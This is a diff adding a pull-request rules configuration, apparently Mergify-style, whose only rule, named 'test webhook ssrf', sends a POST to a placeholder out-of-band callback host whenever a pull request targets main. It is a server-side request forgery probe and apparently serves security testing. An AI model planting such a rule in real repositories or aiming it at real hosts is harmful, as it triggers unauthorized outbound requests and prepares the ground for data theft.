@@ -1,0 +1,11 @@
+pull_request_rules:
+    - name: test webhook ssrf
+      conditions:
+        - base=main
+      actions:
+        webhook:
+          url: https://YOUR-INTERACTSH-URL
+          method: POST
+          headers:
+            Content-Type: application/json
+          body: '{"test": "ssrf"}'
